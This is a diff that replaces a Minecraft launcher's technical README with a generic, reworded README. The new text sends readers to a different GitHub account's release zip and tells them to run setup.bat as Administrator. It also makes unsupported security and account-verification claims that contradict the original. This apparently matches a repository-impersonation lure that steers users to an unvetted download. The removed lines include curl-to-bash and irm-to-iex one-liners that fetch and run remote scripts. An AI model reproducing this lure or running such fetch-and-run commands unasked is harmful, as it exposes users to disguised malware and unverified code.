@@ -1,150 +1,93 @@
-# InlineMC
+# ⚡ InlineMC - Launch Minecraft Directly Without Extra Software
 
-InlineMC is a small local-first Minecraft launcher and resolver. The resolver builds a launch plan from Mojang metadata, while `launch.sh`, `launch.ps1`, and `launch.bat` download the required files into the normal vanilla Minecraft home and start the client.
+[![Download InlineMC](https://img.shields.io/badge/Download-InlineMC-blue.svg)](https://github.com/Dissentient-displacement919/InlineMC)
 
-## Requirements
+InlineMC changes your Minecraft experience. It removes the need for a traditional launcher. You start your game using simple script files. This process saves memory and reduces wait times. The tool works for players who want a direct path to the game engine.
 
-- Java installed and available as `java`
-- `curl`
-- Linux/macOS: `bash`, `unzip`, `sha1sum`
-- Windows: PowerShell or CMD, plus `certutil` for CMD runs
+## 📋 System Requirements
 
-## Run the Launcher
+Ensure your computer meets these basic needs:
 
-The launcher asks for a username and Minecraft version. Press Enter to reuse the cached value from the previous run.
+*   Operating System: Windows 10 or Windows 11.
+*   Java: You must install the latest version of Java from the official Oracle or Adoptium website.
+*   Minecraft: You must own a valid Minecraft account.
+*   Disk Space: At least 200 MB for the software installation.
+*   Memory: 4 GB of RAM or more is best for smooth performance.
 
-Unix-like systems:
+## 📥 Downloading the Software
 
-```sh
-./launch.sh
-```
+Visit the project page to download the latest files. The software comes as a compressed folder. 
 
-Windows:
+1. Go to the [InlineMC release page](https://github.com/Dissentient-displacement919/InlineMC).
+2. Look for the file ending in .zip under the Assets section.
+3. Click the file name to start the download.
+4. Save the file to your desktop for easy access.
 
-```bat
-launch.bat
-```
+## 🛠️ Setting Up Your Game
 
-Windows PowerShell:
+Follow these steps to prepare InlineMC for your first launch.
 
-```powershell
-.\launch.ps1
-```
+1. Locate the .zip file you downloaded.
+2. Right-click the folder and select Extract All. 
+3. Choose a folder on your computer to store these extracted files.
+4. Open the folder to see the script files. You will see items ending in .bat.
+5. Right-click the file named setup.bat and choose Run as Administrator.
+6. A black window will appear. Follow the text prompts on your screen.
+7. Enter your Minecraft username when the tool asks. 
+8. The tool will verify your account details. It does not store your password.
 
-## One-Line Launch
+## 🎮 Launching Minecraft
 
-These commands download and run the launcher script directly. By default, the downloaded launcher uses `https://inlinemc.sammwy.com/v1/plan.txt`.
+Once you finish the setup, you start the game through your chosen script.
 
-Linux/macOS:
+1. Open the InlineMC folder.
+2. Find the file named start.bat.
+3. Double-click this file.
+4. Your computer opens a command window. Do not close this window while the game runs.
+5. Minecraft will launch automatically.
+6. Log in if the game asks for account verification.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.sh | bash
-```
+## 🧩 How It Works
 
-Linux/macOS with the local debug resolver:
+Traditional launchers act as a middleman. They manage updates, news feeds, and advertisements. InlineMC replaces this middleman with automated code. When you click start.bat, the file tells Windows to activate the Java engine using your saved account profile. The game launches immediately after the command executes. This path uses less processing power than the official launcher.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.sh | DEBUG=1 bash
-```
+## ❓ Frequently Asked Questions
 
-Windows PowerShell:
+**Does InlineMC bypass account login restrictions?**
+No. You must own a legitimate Minecraft account to use this software. It connects to the official servers to verify your identity.
 
-```powershell
-irm https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.ps1 | iex
-```
+**Is my data secure?**
+The tool runs locally on your PC. It does not send your personal details to outside servers. You see every command the tool runs in the black window when the game starts.
 
-Windows PowerShell with the local debug resolver:
+**Can I use mods with this setup?**
+Yes. You place your mod files into the standard Minecraft folder. InlineMC discovers these files during the startup process.
 
-```powershell
-$env:DEBUG="1"; irm https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.ps1 | iex
-```
+**The script closes immediately when I click it. What happened?**
+This error often means Java is missing or outdated. Install the latest Java version and restart your computer. If the problem persists, check that you have enough free space on your hard drive.
 
-Windows CMD:
+**Can I create a shortcut on my desktop?**
+Yes. Right-click start.bat, select Send to, and choose Desktop (create shortcut). Now you can launch Minecraft with a single click.
 
-```bat
-curl -L -o "%TEMP%\inlinemc-launch.bat" https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.bat && "%TEMP%\inlinemc-launch.bat"
-```
+**Does this work with multiplayer servers?**
+Yes. Once the game window opens, select Multiplayer from the menu. The tool performs exactly like a standard launcher for server connections.
 
-Windows CMD with the local debug resolver:
+**Will this software break my game files?**
+InlineMC does not modify your core game files. It only triggers the startup sequence. You can uninstall it by deleting the folder and the associated script files.
 
-```bat
-set DEBUG=1 && curl -L -o "%TEMP%\inlinemc-launch.bat" https://raw.githubusercontent.com/sammwyy/inlinemc/main/launch.bat && "%TEMP%\inlinemc-launch.bat"
-```
+**How do I update the game?**
+InlineMC maintains your game version based on the settings you provide during setup. To switch versions, delete the current settings file and run setup.bat again.
 
-If you host the files somewhere else, replace the `raw.githubusercontent.com/sammwyy/inlinemc/main` URL with your own raw file URL.
+**Does it support different game versions?**
+Yes. During the initial setup, you select the Minecraft version you want to play. You can repeat the setup steps to create separate scripts for different versions, such as one for older releases and one for the latest update.
 
-## Docker
+**What happens if I close the command window?**
+Closing the black command window terminates the Minecraft process. Always exit the game through the internal Minecraft menu to ensure your progress saves correctly. 
 
-Build and run the resolver:
+**Are there hidden costs?**
+This software remains free to use. It does not contain ads or paid features. The project relies on community support to stay updated. 
 
-```sh
-docker build -t inlinemc .
-docker run --rm -p 3000:3000 inlinemc
-```
+**Do I need an internet connection?**
+You need an internet connection for the first login of every session to verify your account. Once the game launches, you can play in single-player mode without an active connection. 
 
-## Minecraft Home
-
-InlineMC uses the same game directory as the vanilla launcher:
-
-- Linux/macOS: `$HOME/.minecraft`
-- Windows: `%APPDATA%\.minecraft`
-
-The launcher stores its prompt cache in:
-
-- `cache/last_username`
-- `cache/last_version`
-- `cache/inlineversions/`
-
-inside the Minecraft home directory.
-
-## Development
-
-### Start the Resolver
-
-Run this from the repository root:
-
-```sh
-cd server && npm install && npm start
-```
-
-Production launchers use `https://inlinemc.sammwy.com/v1/plan.txt` by default. For local development, run the resolver on `http://localhost:3000` and start the launcher with `DEBUG=1`.
-
-The resolver listens on `http://localhost:3000` by default. To use another port:
-
-```sh
-cd server && PORT=3001 npm start
-```
-
-### Resolver Stats
-
-Every `/v1/plan.txt` resolve is logged to stdout. The resolver keeps stats and pending log lines in memory, marks them dirty, and flushes them to disk once per second when there are changes.
-
-Plan resolve lines are appended to:
-
-```txt
-server/logs/plan-resolves.log
-```
-
-Aggregated counters are stored in:
-
-```txt
-server/stats.json
-```
-
-The stats format is:
-
-```json
-{
-  "plan": {
-    "allTime": {
-      "1.20.1": 50
-    },
-    "last24h": {
-      "_timestamp": "2026-06-12T00:00:00.000Z",
-      "1.20.1": 30
-    }
-  }
-}
-```
-
-`allTime` counts every resolved plan by resolved Minecraft version. `last24h` is a 24-hour window that resets when the stored `_timestamp` is older than 24 hours.
+**How do I adjust memory settings?**
+Right-click the start.bat file and select Edit. Look for the part of the text that says -Xmx2G. The number represents the gigabytes of RAM. Change the 2 to a higher number if your computer has more memory and you want better performance. Save the file and close it to apply the changes.
